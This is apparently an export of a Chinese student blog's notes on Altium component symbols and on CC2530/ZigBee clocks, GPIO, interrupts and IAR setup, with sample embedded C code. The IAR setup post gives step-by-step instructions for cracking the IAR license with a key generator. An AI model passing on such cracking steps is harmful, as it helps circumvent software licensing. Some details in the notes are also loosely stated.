元件符号的创建1234567891011121314151617181920211. 选中工程文件中的 &#x27;原理图库&#x27;2. 打开 Panels 面板 -&gt; SCH Libarary3. 再此处新建元件符号: 1) 元件符号是元件在原理图上的表现形式 2) 主要由元件 边框、管脚（管脚序号、管脚名称）、元件名称、元件说明组成。4. 注意: 1) 通过&#x27;建立管脚&#x27;来建立&#x27;电气连接&#x27;关系 2) 元件符号中的&#x27;管脚序号&#x27;是与 元件实物 的管脚一一对应的。 3) 图形不一定要与实物完全一样，那是 &#x27;封装&#x27; 所需要考虑的问题。 4) 但是 &#x27;管脚序号&#x27; 和 &#x27;名称&#x27; 一定要严格按照&#x27;元件规格书&#x27;中的说明一一对应号。6. 元件模型的几个基本参数: 1) Design Item ID：元件类型 eg: RES 2) Designator：网络标签 eg: R? # 其中问好表示通配 3) Comment：元件值，如果是电阻就是阻值，；一般设计模型的时候不需要填写。 4) Links：设置产商链接，生产渠道 5) Footprint：设置封装类型 如：0805、0602 操作技巧1234567891011121314151617181920212223242526272829301. 使用系统默认的快捷键: 1) 软件菜单栏里面，每一栏后面都有字母，表示的就是该选项的一个快捷键。 2) 每一个工具栏里面还有许多小选项，配合小选项的快捷键，两个同时按就能唤出对应窗口。2. 自定义快捷键: 1) 按照 ctrl , 然后鼠标左键点击需要设置的功能选项。 2) 就会弹出该功能多对应的快捷键设置页面。3. 设计元件原理图外形的时候，需要放置许多管脚: 1) 在放第一个管脚的时候，按 tab 键设置网络标签的属性起始值。 2) 然后一直放置的时候就是按照顺序了。4. 管脚命名，快捷方式: 1) 复制管脚名称 2) 选中需要命名的管脚，直接 ctrl + V 进行粘贴 3) 剪切板上面的名称就会直接被粘贴到管脚名称属性栏5. 关于元件取名: 1) 电阻：R1、R2、R3...... 2) 电容：C1、C2、C3...... 3) IC芯片：U1、U2、U3..... 4) 排针类：J1、J2、J3......6. 阵列试粘贴: 1) 对于那种有 20 个管脚 或者 40 个管脚的 芯片或者排针。 2) 我们不可能在耗费时间一个个来摆放吧！ 3) 所以，先复制一个排针，然后点击&#x27;编辑 -&gt; 整列式粘贴&#x27;。 4) 主增量表示，给对象 designator代号 进行递增/减。 5) 次增量表示，给对象 name名称 进行递增/减。 6) 水平/垂直放置距离，可以是&#x27;负值&#x27;。 相关经验 看一遍视频，不要边看边操作 看第二遍的时候，可以直接自己做，不会的时候，再回顾视频 这样子效率更加高 对于软件的一些相关操作 设置一个快捷键 然后练它个 50 编，增加肌肉记忆 就像盲敲打字一样，形成一个反射 学习素材 ———– 智能小车制作 链接: https://pan.baidu.com/s/1nH5MC53thHp8AdbWgxsQFw 提取码: 1111","link":"","tags":[{"name":"PCB","slug":"PCB","permalink":"http://www.fangning.xyz.com/tags/PCB/"}]},{"title":"时钟","date":"2020-09-13T14:36:30.000Z","path":"2020/09/13/2020.09.13 时钟/","text":"时钟 cc2530 在正常运行的时候，需要一个高频时钟信号，以及一个低频时钟信号。 高频时钟信号，主要共给CPU ，保证程序的正常运行。他有两个来源： 芯片内部有一个 16M 的 RC震荡电路。 也可以外接一个 32M 的高频石英晶振。 正常工作的时候，其中一个给 cpu 共给。 地频时钟信号，主要共给看门狗，睡眠定时器等片上外设。也有 2 个来源： 芯片内部 32k RC 电路。 d外接 32.768k 石英晶振。 那么四个时钟电路，具体什么时候，是那些时钟在工作呢？ CC2530 芯片默认上电的时候，是默认的两个 RC 震荡电路作为 高 低 频时钟来源。 芯片做串口工作，特别是做无线通信的时候，必须要有 32M 的石英晶振作为时钟来源。 123456789101112131415161718192021222324252627281. 高频时钟特点: 1) 两个高频时钟源，可以同时起振，产生高频时钟信号； ———— 但是&#x27;能有一个供给 cc2530&#x27;作为高频信号。 2) 两个低频时钟源，同时只能有一个起振，作为芯片的低频信号来源。2. 系统高频时钟源切换步骤: 1) 让两个高频时钟源起振。 * 为什么切换的时候需要启动两个时钟呢？ * 因为，一旦cup，没有时钟源来提供时钟信号的话，就会宕机。 * 交接的时候，肯定需要一定时间的，所以两个时钟都需要运行，保证 CPU 的无缝连接。 * &#x27;SLEEPCMD&#x27; 第二位置 0 2) 等待目标时钟源震荡稳定。 * &#x27;SLEEPSTA&#x27; 的第 6 位为 1. 时，高频 32M 时钟信号稳定。 3) 延时一小段时间 ———— 63us； * 超出 63us 也可以的 4) 不分频输出; * 不分频啥意思？ * 当然就是不把一个信号的频率进行改变咯。原来时 32Mhz，以后还是 32M * 不能给它屏蔽一半，变成 16M 或者 8M * &#x27;CLKCONCMD&#x27; 的低三位 置 000 ：表示不分频输出。 5) 选中目标高频时钟源作为系统主时钟； * &#x27;CLKCONCMD&#x27; 的第 6 位置 0：设置外接 32M 作为主时钟。 6) 确认一下当前工作时的系统时钟是不是所选的高频时钟； * &#x27;CLKCONSTA&#x27; 这个寄存器的第 6 位为 0：表示 32M 的时钟源以及作为主时钟。 代码主程序文件1234567891011121314151617181920212223242526272829303132333435363738#include &lt;iocc2530.h&gt;#include &quot;74LS164_8LED.h&quot;void delay()&#123; int i , j; for(i = 0; i &lt; 1000; i++) for(j = 0; j &lt; 800; j++);&#125;/** 以下被注释的代码作用是将系统时钟由默认 16M RC 改成 32M XOSC 高频晶振，可以对比未改之前数码管发现，修改完的数码管显示是原来的两倍，速度快了两倍！void delayms() // 大概延时超过 63us&#123; char k = 63; while(k--);&#125;void Init32M()&#123; SLEEPCMD &amp;= 0xfb; // 1111 1011 开启两个高频时钟沿 while(SLEEPSTA &amp; 0x40); // 判断第四位是否为 1，为 1 的话稳定，等待 32 M 稳点 delayms(); CLKCONCMD &amp;= 0xf8; //1111 1000 后三位清零 不分频输出 CLKCONCMD &amp;= 0xbf; // 1011 1111 设置 32M 作为系统主时钟 while(CLKCONCMD &amp; 0x40); // 等待 32M 成功成为当前系统主时钟&#125;**/void main()&#123; char i; LS164_Cfg(); //数码管初始化操作 //Init32M(); while(1) &#123; for(i = 0; i &lt; 10; i++)&#123; LS164_BYTE(i); //让数码管显示数字 i delay(); &#125; &#125;&#125; 74LS164_8LED.h 头文件123456789#ifndef __74LS164_8LED_H__#define __74LS164_8LED_H__#include&lt;ioCC2530.h&gt;#define LS164_DATA P1_3#define LS164_CLK P1_2#define UCHAR unsigned char void LS164_Cfg();void LS164_BYTE(UCHAR Data);//P1.3 DATA P1.2 CLK#endif 两个函数文件123456789101112131415161718192021222324252627282930#include&lt;ioCC2530.h&gt;#include&quot;74LS164_8LED.h&quot;static UCHAR LED_Map[]=&#123;0x3f,0x06,0x5b,0x4f, 0x66,0x6d,0x7d,0x07, 0x7f,0x6f,0x00,0xFF&#125;; //前面 10 个元素表示 0~9 ，后面两个表示全灭和全亮void LS164_Cfg()&#123; P1SEL &amp;=~0x0C;//xxxx 00xx 配置为普通IO模式 P1DIR |=0x0C;//xxxx 11xx 配置为输出模式&#125;void LS164_BYTE(UCHAR Index) //P1.3 DATA P1.2 CLK&#123; UCHAR i=0; UCHAR Data=LED_Map[Index]; // 这里可能芯片引脚资源有限，没有用三八译码器，只用两位输入，控制8种输出，所以用了74LS164一个一个来置字 for(;i&lt;8;i++) &#123; if(0x80 &amp; Data) &#123; LS164_DATA=1; &#125; else &#123; LS164_DATA=0; &#125; Data=Data &lt;&lt; 1; LS164_CLK=0; // 置下一位 LS164_CLK=1; &#125;&#125;","link":"","tags":[{"name":"zigbee","slug":"zigbee","permalink":"http://www.fangning.xyz.com/tags/zigbee/"}]},{"title":"外部中断","date":"2020-09-12T06:20:34.000Z","path":"2020/09/12/2020.09.11 外部中断/","text":"掌握所有引脚的外部中断## 概述 一个水源（EA），下面有三个组开关（P0IE、P1IE、P1IE）。每个组开关内，又分别有 8、8、5 个 I/0 口开关（中断开关 PxIEN）。 ​ 类似于水管，想要最下面的水龙头流水，就得先让最上面的水塔开关打开，然后还得把中间的总管道开关打开，最后，只需要打开龙头开关，就会有水。 ​ 因此，如果需要给某个脚配置成中断，就必须先满足，开总中断使能，组内中断使能，以及对应 I/O 口中断打开。 中断条件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354551. 初始化 IO 口工作在 &#x27;普通IO、上拉输入状态&#x27; 1) 配置 PxSEL 2) 配置 PxDIR 3) 配置 PxINP 4) 配置 P2INP2. 开 IO 口组中断。3. 开组内对应的具体某 IO 口中断。4. 配置&#x27;上升&#x27;还是&#x27;下降&#x27;沿触发: 1) 一个寄存器控制 P0-P1-P2 三组 21 个 IO 脚的中断触发类型，上升沿 或者 下降沿 ———— &#x27;PICTL&#x27; 2) 关于寄存器 PICTL 具体对应控制 IO 口的关系图，如下图所示。 &#x27;D0 控制 P0&#x27;, &#x27;D1 和 D2 控制 P1低四位 P1高四位&#x27;, &#x27;D3 控制 P2&#x27; 。5. 开中断使能 1) 开 CPU 总中断 EA = 1 2) 开小组中断控制位 ———— P0IE | P1IE | P2IE * &#x27;如果一个寄存器的首地址是 8 的倍数，结尾是 0 或 8 ， 那么改寄存器内部所有位都会被 宏定义！！！&#x27; * 反之，如果寄存器首地址不是 8 的倍数，那么该寄存器内部所有位都不会被 宏定义。 * P0IE 处于首地址为 8 的倍数的寄存器内，所以被宏定义了，可以直接赋值 P0IE = 1 * P1IE 和 P2IE 这两个其实是不被定义的，所以用不辽，需要对他们所属寄存器进行值数。 他们都处于寄存器 IEN2 中: P1IE ----&gt; IEN2 第 4 位， P2IE ----&gt; IEN2 第 1 位。 6. 写中断函数: 1) #pragma verctor = P0INT_VECTOR * #pragma 预处理，设定编译器状态，或者制定编译器完成特定动作。 * #pragma verctor 告诉编译器，&#x27;在这里设置中断服务函数入口地址&#x27; * 将 &#x27;中断服务函数入口地址&#x27; 设置为 &#x27;P0INT_VECTOR&#x27; ———— 该地址在头文件中有定义。 * 如果是其他组中断，可以改成 P1INT_VERCTOR | P2INT_VERCTOR 2)&#x27; __interrupt &#x27;: 中断函数声明关键字，后接中断函数就行了。 3) 中断函数出口之前，&#x27;清除中断标志位&#x27;：&#x27;PxIF = 0&#x27; * &#x27;小组中断标志位 PxIF&#x27; ———— 如果值为 1， 表示该小组内有中断触发。 * 为什么要清除中断标志位？ * 加入一个下降沿电位触发的中断，在接受到一个连续的下降沿的时候，中断标志位会置1。如果下降沿持续了较长时间的话，那么处理完第一个中断函数，又会不断的再次处理中断函数，因为没有消除多余的中断触发信号的影响。 * 所以，只有在处理完一个中断函数的时候，顺便清除一下中断标志位，&#x27;这样子同一时间内中断任务就只会被执行一次就够了&#x27;。 * P0IF -- P1IF -- P2IF 4) 中断是否为指定 I/O 口造成的中断: &#x27;函数结束时，也需要清零 PxIFG = 0&#x27; * &#x27;组内中断标记寄存器 ———— PxIFG&#x27; ———— 如果某一位为 1， 表示该位对应 I/O 口触发外部中断。 * 既然以及产生中断了，小组中断标志位也已经触发了，也就进入了小组中断函数入口地址。 * 但是入口地址是组内公用的，那到底具体是哪个 I/O 口引发的中断呢？ 如果同一个小组内，有多个 I/O 作为外部中断触发引脚。可是中断入口是共用的，所以必须在中断函数内，&#x27;再加一个中断标识条件，来确定是否是指定 I/O 口的中断触发&#x27;。 * if( P0IFG &amp; 0x20 == 1) 表示 P0 组第五位 I/O 口触发了中断。 此时在条件语句内写改中断函数内容就行了，就不会受到组内别的中断影响。 5) &#x27;消除&#x27;按钮抖动等&#x27;误操作触发的中断&#x27; * 按钮抖动也可能会触发中断，人工按下的话中断触发时间较长。 * 为了消除按钮抖动的影响，我们在中断触发函数内，加一个延时。 * &#x27;延时一小段时间时候，如果按钮还是按下的状态&#x27;，那么&#x27;表示是人为触发的&#x27;。如果不是，那直接跳出中断函数。 相关经验 什么是外部中断 在没有干预的情况下，单片机的程序在封闭状态下自主运行，如果在某一时刻需要响应一个外部事件(比如有按键按下)**，这时就会用到外部中断。具体来讲，外部中断就是在单片机的一个引脚上，由于外部因素导致了一个电平的变化(比如由高变低)，而通过捕获这个变化，单片机内部自主运行的程序就会被暂时打断，转而去执行相应的中断处理程序，执行完后又回到原来中断的地方继续执行原来的程序**。这个引脚上的电平变化，就申请了一个外部中断事件，而这个能申请外部中断的引脚就是外部中断的触发引脚。 给寄存器某一位位值数的时候 置0与1 ———— P0SEL &amp;= 0xfe // 1111 1110 最后一位置0 置1或0 ———— P0SEL |= 0x01 // 0000 0001 最后一位置1 给一个 0 置 1 或 给 1 置零 与 1 异或 运算。 相同结果为 0， 不相同结果为 1 . a = 1; a ^= 1; a –&gt; 0; a = 0; a ^= 1; a –&gt; 1; C 语言中没有 同或操作。 有按位取反操作 a = ~a ； #pragma optimze = none 关闭 IAR 编译器对下列函数的优化。必须放在函数外部，起始位置。 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;iocc2530.h&gt;void delay(int x);void main()&#123; //P0_5下，就会接受到一个下降沿（触发中断），让 led3-P0_4 灯亮（中断处理函数） P0SEL &amp;= 0xdf; //1101 1111 普通io P0SEL &amp;= 0xef; //1110 1111 普通io P0DIR &amp;= 0xdf; //1101 1111 输入 P0DIR |= 0x10; //0001 0000 输出 P0INP &amp;= 0xdf; //1101 1111 上下拉 P2INP &amp;= 0xdf; //1101 1111 上拉 EA = 1; //总中断 P0IE = 1; //小组中断 // IEN2 |= 0x10 -------&gt; P1IE = 1 这两个寄存器位地址（0x9A）不是 8 的倍数，所以不被宏定意，只能通过找到相应的寄存器置位。 // IEN2 |= 0x02 -------&gt; P2IE = 1 P0IEN |= 0x20; // 0010 0000 开组内中断 PICTL |= 0x01; // 将 P0 小组配置成下降沿触发。 while(1); //中断已开，啥都不需要管了，就等外部中断触发条件就行了。&#125;#pragma optimize = none#pragma vector = P0INT_VECTOR //设置中断函数向量，给中断函数地址__interrupt void button()&#123; if(P0IFG &amp; 0x20) //增加一个标识 确定是否时 P0_5 引发的中断 &#123; delay(30); if(P0_5 == 0) // 消除按钮抖动触发中断的情况 &#123; P0_4 = ~P0_4; // P0_4 ^= 1 如果中断触发，LED 灯亮/灭 &#125; &#125; P0IFG = 0; //清零中断标志 P0IF = 0;&#125;void delay(int x)&#123; int i, j; for(i = 0; i &lt; x; i++) for(j = 0; j &lt; 1000; j++);&#125;","link":"","tags":[{"name":"zigbee","slug":"zigbee","permalink":"http://www.fangning.xyz.com/tags/zigbee/"}]},{"title":"我的随笔","date":"2020-09-11T08:22:50.000Z","path":"2020/09/11/2020.09.12 第一篇随笔/","text":"建立个人博客了特殊一年​ 2020年，全球爆发新冠状病毒，此时我正读大二下半学期。因为疫情，这一学期全国大部分学校都没开学，我也因此在家过了大半年。 ​ 也就是这段时间，我终于自己搭建了一个，一直让我心心念念的个人博客。 ​ ​ 之前看过许多大佬们的技术博客，很羡慕能够在信息爆发的互联网世界当中，有自己的一块小天地。接触互联网也已经有好几年了，不能再一直白嫖网上大佬们的技术成果了，是时候分享一波自己所学知识，回报社会 🤣😘😘😘，奉献自己的一份微薄之力！ ​ 本人以后会在这里分享自己的一些成长经历，对学习生活的一些思考，以及一些所学过的一些知识的汇总。希望可以给各位一个参考，和帮助。 ​ 大三了，时间过得很快，然而自己的技术沉淀却还很少。想把从大一大二所学的所有东西都写下来，想分享自己心里的千言万语，苦于最近实在有点忙。所以，就只能先写到这里了，以后一有时间就会更新的，相信我 😝，就这样吧 ~","link":"","tags":[{"name":"随笔","slug":"随笔","permalink":"http://www.fangning.xyz.com/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"cc2530原理图及引脚功能控制","date":"2020-09-11T00:00:00.000Z","path":"2020/09/11/2020.09.10 zigbee原理图理解/","text":"zigbee无线模块的基本工作电路原理图各部分理解12345678910111213141516171819201. 25 26 : 1) RF_P 和 RF_N 号角所连部分为&#x27;无线部分&#x27;，最后面接着一个天线。2. 40 30 : 1) 40：cdoupl 去耦电容。 2) 30 Rbias 为偏置电阻。 3) &#x27;这两个必须正确连接，8051单片机才能正常仿真、烧录程序&#x27;3. 32 33 : 1) 所连接部分接 &#x27;低频精准时钟源&#x27;。可用，可不用。 2) 主要用来做 定时器，或者 看门狗 才能用到。4. 胜达电子 与 TI cc2530基本工作电路的&#x27;不同点&#x27;: 1) 复位电路，实现按键复位 和 通电复位。 * 20 reset 脚提供程序 1us 低电平信号，即可复位。 * 20 号交接复位电路。 2) 下载程序电路 * 下载程序所需条件 电源，GND，reset，34 P2_1，35 P2_2 &#x27;五条线齐全，就可以下载程序&#x27; * 将上面五根线接入一个 JTAG下载接口 ，就可以通过仿真器进行程序烧入了！ 3) 只要有 &#x27;电源，地线，去耦电容，偏执电阻，以及程序烧录口P2_1,P2_2&#x27;，加上基本的&#x27;晶振&#x27;。&#x27;芯片就可以正常工作了！！&#x27; 如何控制 I/O 口输入/出12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849501. i/o 口: 21个 1) P0_0 ~ P0_7 2) P1_0 ~ P1_7 3) p2_0 ~ P2_4 4) 所用引脚都可以作为普通 i/o 口。 5) 部分引脚有特殊功能，可以作为&#x27;片上外设&#x27;。 # 由相应的寄存器控制。 6) 要么某一时刻作为 i/o 要么作为 片上外设，不能冲突。2. P1_0 和 P1_1 有 20mA 的驱动能力。 其余引脚只有 4mA。3. 输出如何配置: 用 P1_0 来进行输出，控制 LED 灯。 1) 先让它处于 &#x27;普通I/O口模式&#x27;，而非片上外设。 * 两种模式的切换，是由寄存器进行控制的。 * &#x27;P0SEL&#x27; | P1SEL | P2SEL 这三个寄存器分别管理 &#x27;P0&#x27; | P1 | P2 三组引脚。 * &#x27;寄存器的&#x27;其中 &#x27;0~7 位&#x27;，对应&#x27;引脚 Px_0 ~ Px_7&#x27; 。 * 每一位&#x27;是 0&#x27;，表示对应引脚为 &#x27;普通 i/o 口&#x27;。 &#x27;1&#x27; 表示为 &#x27;片上外设口&#x27;。 * 注意 P2_1 和 P2_2 一般用来作为程序烧入口，不作为 普通I/O 口。 &#x27;其他口随便用&#x27;！ 2) 其次，让 P1_0 处于输出状态。 * 输入/出 状态的控制，也是由一组寄存器进行控制的。 * &#x27;P0DIR&#x27; | P1DIR | P2DIR 这桑寄存器分别管理 &#x27;P0&#x27; | P1 | P2 三组 I/O 口 输入或输出。 * 寄存器每一位 &#x27;0&#x27; 表示对应的引脚进行 &#x27;输出&#x27;。&#x27;1 表示&#x27;对应引脚进行 &#x27;输入&#x27;。 3) 最后，根据要求，让其处于 输出 高/低 点平。 * 设置 Px_x = 0 输出高电平， Px_X = 1 输出低电平。 4. # 以上两种寄存器 PxSEL and PxDIR 默认情况下的值都是 0x00;5. 输入如何配置: 读取 P0_6 状态，高电平表示&#x27;跳线帽&#x27;断开，低电平表示&#x27;跳线帽连接&#x27;GND。&#x27;见原理图 指针和等效光敏 模块&#x27;。 1) 让 p0_6 处于普通 I/O 口状态。 P0SEL = 0 2) 让 P0_6 处于输入状态。 P0DIR = 0 3) &#x27;让 P0_6 处于上拉、下拉或者三态 中的一种状态&#x27;。 * 上拉电路，很容易理解，就是引脚与外设之间，接一个电阻与VCC电源，来提高电压。 * 下拉电路，很容易理解，就是引脚与外设之间，接一个电阻与GND接地，来减低电压。 * 那什么是&#x27;三态呢？&#x27;，就是引脚与外设之间，接一个&#x27;无穷大的电阻&#x27;。 为什么要这样做，这样做有什么作用呢？ 当我们的引脚是需要&#x27;读取&#x27;外部设备的&#x27;电压值&#x27;的时候，接&#x27;上拉或者下拉&#x27;会&#x27;影响输入结果&#x27;。此时接一个无穷大的电阻，可以保证它想断路一样，不会分压，又可以通过连通读取到接入点的电压值。 例如: 使用&#x27;热敏电阻传感器&#x27;，或者&#x27;光敏电阻传感器&#x27;的时候，传感器电压值，会随着温度变化，分压也随之变化，我们单片机就需要采集到传感器与地之间的电压值，然后计算出外界环境的变化。&#x27;ADC采集的时候一定要接三态&#x27;。 4) 那么如何设置输入引脚是处于哪一种状态呢？ 用到了另外一组寄存器 &#x27;PxINP&#x27; * &#x27;P0INP&#x27; 中的第六位 如果是 &#x27;0&#x27; 表示 P0_6 处于 &#x27;上拉|下拉&#x27; 状态。 * &#x27;P0INP&#x27; 中的第六位 如果是 &#x27;1&#x27; 表示 P0_6 处于 &#x27;三态&#x27; 状态。 * 进一步确定，到底是处于上拉，还是下拉状态呢？ 这里用到了 &#x27;P2INP的高三位&#x27;！ * 因为 P2组 实际只存在五个引脚，&#x27;高三位不存在&#x27;，所以！&#x27;P2INP 高三位是闲置的&#x27;！！ * P2INP_5 --&gt; P0组的 上拉/下拉 P2INP_6 --&gt; P1组的 上拉/下拉 P2INP_7 --&gt; P2组的 上拉/下拉 5) 因为 PxSEL, PxDIR, PxINP 三个寄存器都是默认值为0. 所以，我们说这些引脚都是默认&#x27;普通IO口 上拉 输入&#x27;。 相关经验 目前所学的控制寄存器： PxSEL：控制三组引脚的作用，外设或者普通 I/O 口。 PxDIR：控制三组引脚的 I/O 状态，输入或输出。 PxINP：控制三组引脚的输入状态 上拉|下拉 或 三态。 P2INP 的高三位：控制三组引脚的 上拉或下拉 跳线帽 就是开发板上，连接了两个相邻排针的导体，类似给排针戴了顶帽子，所以叫做跳线帽。 zigbee 模块上，cc2580的 P0_6排针 与 GND排针 之间就有一个跳线帽。 zigbee 模块上，LED8 与 GND 之间也有一个跳线帽。 zigbee 常用引脚的位宏定义。 比如其中一个 P0_2 表示的就是 P0 组引脚中的 第三个引脚。 而单片机中，如果需要对寄存器位进行赋值操作，需要先声明一个位变量sbit P0_2 = P0^2 代码123456789101112131415161718192021222324252627#include &lt;iocc2530.h&gt;void delay(int x);void main()&#123; // 设置 P0_6 输入，确定 跳线帽的状态 P0SEL &amp;= 0xbe; // 设置 P0_6 , P0_0 为 i/o 口 1011 1110 P0DIR &amp;= 0xbf; // 设置 P0_6 输入 1011 1111 P0DIR |= 0x01; // 设置 P0_0 输出 0000 0001 P0INP &amp;= 0xbf; // 设置 P0_6 组引脚为 上/下拉 1011 1111 P2INP &amp;= 0xdf; // 110 11111 设置 P0 组引脚为上拉 while(1)&#123; //跳线帽插上，灯亮。跳线帽拔掉，灯灭。 if( P0_6 == 0) &#123; P0_0 = 1; &#125;else&#123; P0_0 = 0; &#125; &#125;&#125;void delay(int x)&#123; int i, j; for(i = 0; i &lt; 300; i++) for(j = 0; j &lt; x; j++);&#125;","link":"","tags":[{"name":"zigbee","slug":"zigbee","permalink":"http://www.fangning.xyz.com/tags/zigbee/"}]},{"title":"zigbee环境搭建","date":"2020-09-10T12:46:25.000Z","path":"2020/09/10/2020.09.10 搭建开发环境编写及仿真/","text":"软件安装，程序编写运行，烧录IAR安装 12345678910111213141. IAR程序下载: 1) 不要从脚本之家之类的网站下载软件。否则，你的浏览器会被恶意串改主页。并且，电脑上会被恶意下载软件。 2) 从官网下载最新版的 IAR for 8051 就行了。 2. IAR程序破解: 教程：&quot; https://blog.csdn.net/qq_38351824/article/details/85005672 &quot; 1) 从可靠途径获得破解软件。 2) 运行破解软件，选择所需要破解的版本。生成密钥 3) 将密钥复制到 IAR程序密钥验证 步骤中，注意断网。 4) IAR 会在生成一个文本，给它放在桌面。 5) 将该文本路径填写到 破解软件 第二栏中，生成另外一个破解 文本。 6) 将破解文本填写到 IAR程序 注册所需文件中，然后一直下一步就行了。 # 注意，最后提取库文件的时候会失败，因为 IAR库文件 是需要另外一套 password 的。 # 但是也不需要担心，我们一般用不到库文件，或者即使要用，也是后期手动下载导入。 使用 新建工程： project -&gt; new project 选择新建一个 8051 的空白文件。 同时新建一个文件夹 lesson1 用来存储所有的工程文件。 工程名取名为 lessonp == lesson project 新建一个空白文件，取名为 lesson.c 用来存储程序文件。 右击工程，add -&gt; add lesson.c 导入源文件到工程。。 写个主函数，然后运行，弹出一个 工作区保存路径，填写 lessonw == lesson workspace 程序编写 1234567891011121314151617181920212223242526272829303132333435361. 头文件 #include &lt;iocc2530.h&gt;2. 配置工程文件: 1) 右击工程 -&gt; 修改常用选项中的 Device 驱动，找到在安装目录下 texas Instruments 中找到相应的 cpu cc2530F256。 2) 选择 linker -&gt; Output 勾选 Override default 和 Allow C-SPY-specific extra output file # 程序可以进行在线烧录，仿真。 3) 选择 Debugger 调试， 驱动器修改虚拟软件仿真 为 &#x27;Texas Instruments&#x27; 真正的硬件仿真器。 3. 安装仿真器(Texas Instruments)驱动。驱动所在路径：&quot; C:\\Program Files (x86)\\IAR Systems\\Embedded Workbench 8.1\\8051\\drivers\\Texas Instruments &quot;4. 仿真器上有两个红灯，其中一个是供电灯，另外一个是是否识别到 zigbee 芯片模块灯: 1) 当能够识别到硬件的时候，其中一个灯不亮。表示正常，可以进行下载程序。 2) 否则，如果两个灯都亮，就需要进行按键复位一下，重新识别硬件。5. IAR 中，先编译 --&gt; 再下载烧录程序。6. 调试: 1) 烧录程序后，直接进入程序执行状态。 2) 点击暂停按钮，可以进入 debug 状态。 3) 曲线图标：逐行运行 4) 向内∟图标: 逐行调试，遇到函数进入。 向外∟图标: 跳出当前所在函数。 5) 小三角加条竖线: 跳转到下一个标记节点。 7. 生成 hex 文件: 1) option -&gt; linker -&gt; extra Output 2) 勾选生成 Overide default文件名取名为 &#x27;lesson1.hex&#x27;。 3) 选择 OutPut fomat 格式为 &#x27;intel-extended&#x27;8. hex 文件作用: 1) 一种 16 进制程序文件，相当于源代码，但是可以不用再结果 IAR 编译器编译。 2) 可以直接使用烧录软件，烧录到 zigbee开发板 中。 3) flash Programmer 下载地址:&quot; https://www.ti.com/licreg/docs/swlicresults.tsp?countryName=China+%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29&amp;eeq=Civil&amp;Certify=YES&amp;submitsubmit=Submit &quot; 4) 自动获取仿真驱动软件，选择好 hex 文件，点击开始烧录就行了！！ 相关经验 带排线的那个 zigbee 模块 ———— 是仿真用到。 最小的那个模块 ———— 抓取无线数据包的硬件工具 dongle 代码12345678910111213141516171819202122#include &lt;iocc2530.h&gt;void delay(int x)&#123; int i, j; for(i = 0; i &lt; 300; i++) for(j = 0; j &lt; x; j++);&#125;// P0组 低四位输出 各自连接一个led灯, 形成流水灯。P0SEL &amp;= 0xf0; // 最后四个引脚设置为 I/OP0DIR |= 0x0f; // 最后四个引脚进行输出int v = 0x01;while(1)&#123; P0 = v; delay(1000); P0 = 0x00; delay(1000); v = v &lt;&lt; 1; if(v == 0x10) v = 0x01;&#125;","link":"","tags":[{"name":"zigbee","slug":"zigbee","permalink":"http://www.fangning.xyz.com/tags/zigbee/"}]},{"title":"zigbee概述","date":"2020-09-09T09:00:00.000Z","path":"2020/09/09/2020.09.09 zigbee 概述/","text":"zigbee组成12345678910111213141516171819202122232425262728293031321. zigbee 不像 51单片机 只需要理解里面的寄存器就可以玩转: 1) zigbee 最主要的是协议栈。它包含了很多的协议站，以及相关代码。这是最难的。 2) 资料方面，互联网上关于 zigbee 相关的深入浅出的资料很少。特别是关于讲解&#x27;协议栈&#x27;这一方面。2. 术语: 1) zigbee, zigbee通信方式，zigbee协议 三者都是一个意思。 2) 节点，无线模块，无线设备，三者都是一个意思。3. 计算机之间，局域网采用以太网协议: 1) zigbee之间通信，同样的，采用zigbee协议 2) 作用：&#x27;构建无线局域网！！&#x27;4. 如果一个无线局域网用于传感器的数据收集和监控，那么这个网络就叫做&#x27;无线传感器网络&#x27; 1) 也就是说，无线传感器网络是无线局域网的一个具体应用。5. 已经有了 蓝牙 和 wifi 为什么还要用 zigbee: 1) 蓝牙：功耗低，但是组件网络的节点数少 7~8个。 2) wifi：通信功率 比较大， 功耗大。 3) zigbee：可以组将大概模网络，节点可以上万个！功耗低(cc 2530 正常工作电流8mA, 最低工作达到几个uA)。 缺点：通信速率比较小，250 kbs。比较适合传感器的信息传送。6. 应用方面: 1) 家具方面：可以用电池，或者太阳能供电。 2) 工业方面：传统使用总线组将局域网，如果有zigbee的话，就可以无线组网。 3) 农业方面：组将无线传感器网络，温湿度传感器，二氧化碳浓度等传感器的数据组网收集。 4) 医疗方面：...... 5) 物联网时代，zigbee 使用十分频繁。7. zigbee 模块一般配合上位机构建控制系统: 1) 上位机可以是 pc，也可以是通过互联网的远程服务器。 2) 上位机可以实现对 zigbee 系统中的元件控制。 3) 主 zigbee 与 计算机之间 是&#x27;采用串口进行通信&#x27;的。也就是和 arduino 串口通信一样，需要使用一根数据线连接电脑。计算机获取数据。 zigbee组网组成12345678910111213141516171819202122232425262728291. 局域网内主要有三种成员: 1) 自顶向下：调节器，路由器，终端。三者都是使用zigbee模块来组成的。 2) 上位机主要是与主zigbee进行数据交互通信。 3) 远程服务器，是为了外出也能控制家里的物联网设备。2. 以太网协议通信条件: 1) 硬件：网卡 2) 软件：以太网协议栈（一堆程序代码？？？）3. zigbee 协议通信条件: 1) 软件上：zigbee协议栈（一堆程序代码） 2) 硬件上：&#x27;一种支持zigbee底层协议的芯片&#x27;。4. 几种关键字的含义: 1) zigbee联盟：ambare/飞思卡尔... 制定zigbee协议的一个协会组织，再美国的TI公司。 zigbee厂商，主要把zigbee协议用于推广和实际应用。 2) zstack TI：zigbee软件上&#x27;支持的协议栈&#x27;，由 TI 公司开发，并不是 zigbee 本身的底层协议. 3) cc2530：就是 TI 公司推出的&#x27;其中一&#x27;种&#x27;支持 zigbee 底层协议&#x27;的 &#x27;硬件芯片&#x27;。 4) IAR：编程软件，编译程序，下载烧录程序到 zigbee 开发板。5. cc2530芯片：cc2530F256 TI 50j.. # zigbee芯片上那块小的板子，中间的黑色正方形就是cc2530 1) F 标识flash，存储程序的rom 256kb 最大的一款。 2) 所有的种类芯片，ram 只有8K。 3) 50j：表示的是产品信息。6. 学习方法: 1) 记录学习笔记，做实验，抓包 2) 1~6 节可以按照顺序看，第七部分上半部分协议栈的使用学习完，可以直接先看第八部分 zigbee无线网络通信。熟悉这两部分之后，在学习 OSAL 以及对比学习其他通信方式。 3) 所有内容可以先粗看一遍，所有例子烧录进去观察现象，再来细看学习。 相关经验 手机是不能直接和 zigbee 进行数据通信的。 计算机的作用就是，将 zigbee 